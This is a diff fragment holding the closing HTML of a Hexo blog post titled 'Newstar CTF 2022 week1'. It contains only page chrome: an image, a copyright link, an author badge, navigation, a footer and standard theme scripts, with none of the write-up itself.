+<p><img src="1667052387343.png" alt></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/" title="Newstar CTF 2022 week1" target="_blank" rel="external">https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>转载请注明出处^_^</strong> 
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="" target="_blank"><span class="text-dark">fevergun</span><small class="ml-1x">Ctfer &amp; Reverse &amp; Crypto</small></a></h3>
+        <div>Reverse , Crypto</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2022/09/16/NTRU/" title="NTRU"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/feverhu" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://blog.csdn.net/fevergun" target="_blank" title="Csdn" data-toggle=tooltip data-placement=top><i class="icon icon-csdn"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
